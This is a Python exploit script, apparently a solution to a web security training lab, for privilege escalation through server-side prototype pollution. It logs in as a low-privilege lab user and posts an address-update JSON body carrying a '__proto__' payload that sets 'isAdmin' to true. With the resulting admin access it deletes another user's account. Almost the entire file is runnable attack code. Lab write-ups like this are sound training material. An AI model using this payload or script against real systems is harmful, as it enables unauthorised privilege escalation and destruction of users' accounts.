# Privilege escalation via server-side prototype pollution

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to log in as Wiener...')
	account_path = url + '/my-account'
	login_path = url + '/login'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, json=login_data)
	time.sleep(1)
	return r

def get_admin(s, url):
	print('\n[+] Trying to find prototype pollution vector...')
	js_file_path = url + '/resources/js/updateAddress.js'
	change_address_path = url + '/my-account/change-address'
	js_content = s.get(js_file_path).text
	time.sleep(1)
	print('---------------------------------------------')
	print(js_content)
	print('---------------------------------------------')
	print('\n[+] Trying to set "isAdmin" to "true"...\n')
	session = s.cookies['session']
	payload = f"""{{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"{session}","__proto__": {{"isAdmin": true}}}}"""
	print(payload)
	r = s.post(change_address_path, data=payload)
	time.sleep(1)
	r = s.get(url + '/my-account')
	if 'Admin panel' in r.text:
		print('\n[+] Successfully promoted Wiener to Admin !')
		return True
	return False

def delete_carlos(s, url):
	print('[+] Trying to delete Carlos account...')
	r = s.get(url + '/admin/delete?username=carlos')
	return r

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Privilege escalation via server-side prototype pollution')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print("\n[+] Trying to find a way to delete Carlos account...")
			r = connect_as_wiener(s, url)
			get_admin(s, url)
			time.sleep(2)
			r = delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
